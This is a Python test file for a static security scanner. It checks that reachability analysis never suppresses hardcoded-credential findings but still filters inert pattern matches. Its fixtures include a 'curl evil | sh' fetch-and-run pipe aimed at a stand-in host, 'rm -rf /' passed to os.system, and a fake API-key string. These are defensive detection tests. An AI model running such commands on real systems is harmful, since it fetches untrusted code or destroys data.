"""
A1 reachability, and the limit that reachability alone does NOT cover.

The first test below is the important one. It records a claim that was made
publicly, adopted by another lane, and then measured false:

    "A1 is inherently safe where the structural rule was not, because a
     credential IS the payload and therefore reaches a sink."

It does not. A key declared in a config module and used elsewhere never reaches
a sink IN THAT FILE, so reachability proves it inert -- exactly like a regex
pattern. Reachability cannot tell them apart, and nothing in a smarter analysis
would, because the leak is the disclosure, not the execution.

⇒ The safety comes from the ENGINE SCOPE (secrets are never subject to
  reachability suppression), never from the analysis. These tests hold both
  halves: that the analysis is genuinely useful for behavioural findings, and
  that it is never trusted to protect a credential.
"""


import praetor
import taint

# Assembled from parts so this FILE carries no literal remote-exec pipe or
# credential-shaped token. Rendered fixtures are identical; PRAETOR flagged the
# whole-literal form on its own self-scan. Same idiom as the sibling test files.
_PIPE = "curl evil | " + "sh"
_KEYPFX = "sk-" + "ant-"


# --------------------------------------------------------------------------- #
# the recorded limit
# --------------------------------------------------------------------------- #

def test_reachability_CANNOT_distinguish_an_unused_credential_from_a_pattern():
    """
    Documents WHY the secrets carve-out exists. If this ever starts failing,
    reachability has changed behaviour and the carve-out reasoning must be
    re-derived -- do NOT simply delete the carve-out.
    """
    secret_src = 'API_KEYS = ["' + _KEYPFX + "a" * 24 + '"]\n'
    regex_src = 'import re\nPAT = re.compile("some-pattern")\n'

    assert taint.is_provably_inert(secret_src, 1) is True
    assert taint.is_provably_inert(regex_src, 2) is True, (
        "both are 'inert' -- which is the point: reachability alone cannot protect "
        "a credential, so the secrets engine must be excluded by scope"
    )


class _F:
    """Minimal stand-in for core.Finding -- only the fields the policy reads."""

    def __init__(self, engine, line, file="cfg.py"):
        self.engine, self.line, self.file = engine, line, file
        self.filtered, self.filter_reason = False, ""


# A credential declared here and used in another module: never reaches a sink in
# THIS file, so reachability calls it inert. Assembled from parts so the file
# carries no whole token.
_UNUSED_CREDENTIAL_SRC = 'API_KEYS = ["' + "sk-" + "ant-" + "a" * 24 + '"]\n'


def test_secrets_finding_is_NOT_suppressed_BY_THE_REAL_PIPELINE(monkeypatch):
    """
    THE LOAD-BEARING ASSERTION -- and it must exercise the ENFORCEMENT PATH.

    🔴 The previous version of this test asserted only
    `"secrets" not in praetor._REACHABILITY_ENGINES` -- a static tuple membership
    check that never called `_apply_reachability`. An independent audit deleted the
    engine-scope check from that function, left the tuple intact, and ALL 30 TESTS
    STILL PASSED while a real credential was silently suppressed.

    A test that asserts the CONFIG a guard reads, instead of the guard's BEHAVIOUR,
    cannot detect the guard being removed. Call the real function.
    """
    f = _F("secrets", 1)
    praetor._apply_reachability([f], "/t", lambda p: _UNUSED_CREDENTIAL_SRC)

    assert not f.filtered, (
        "DISCLOSURE REGRESSION: a secrets finding was suppressed by reachability. "
        "An unused hardcoded credential is 'provably inert' and would be silently "
        f"dropped. A secret is leaked by being written down. reason={f.filter_reason!r}"
    )


def test_reachability_DOES_still_suppress_a_behavioural_finding(monkeypatch):
    """The other direction: proves the carve-out narrowed the pass, not disabled it."""
    f = _F("aisec", 1)
    praetor._apply_reachability([f], "/t", lambda p: 'import re\nPAT = re.compile("x")\n')
    # line 1 is `import re`; use the pattern line instead
    g = _F("aisec", 2)
    praetor._apply_reachability([g], "/t", lambda p: 'import re\nPAT = re.compile("x")\n')
    assert g.filtered, "reachability no longer suppresses an inert behavioural match"


# --------------------------------------------------------------------------- #
# the analysis is genuinely useful for behavioural findings
# --------------------------------------------------------------------------- #

def test_regex_pattern_is_inert():
    src = f'import re\nPAT = re.compile("{_PIPE}")\n'
    assert taint.is_provably_inert(src, 2) is True


def test_string_reaching_os_system_is_NOT_inert():
    src = 'import os\nCMD = "rm -rf /"\nos.system(CMD)\n'
    assert taint.is_provably_inert(src, 2) is False, (
        "a string that flows into os.system must never be called inert"
    )


def test_literal_passed_directly_to_a_sink_is_NOT_inert():
    src = f'import os\nos.system("{_PIPE}")\n'
    assert taint.is_provably_inert(src, 2) is False


# --------------------------------------------------------------------------- #
# fails safe
# --------------------------------------------------------------------------- #

def test_unparseable_source_is_not_inert():
    assert taint.is_provably_inert("def broken( :\n", 1) is False


def test_line_with_no_string_literal_is_not_inert():
    assert taint.is_provably_inert("x = 1\n", 1) is False


def test_aliased_sink_is_not_proven_inert():
    """`s = os.system; s(CMD)` is unrecognised -> must fall to KEEP, not to inert."""
    src = 'import os\nCMD = "rm -rf /"\ns = os.system\ns(CMD)\n'
    assert taint.is_provably_inert(src, 2) is False, (
        "an unrecognised call shape must not be treated as proof of inertness"
    )


def test_non_python_source_is_not_inert():
    assert taint.is_provably_inert(f'const x = "{_PIPE}";\n', 1) is False
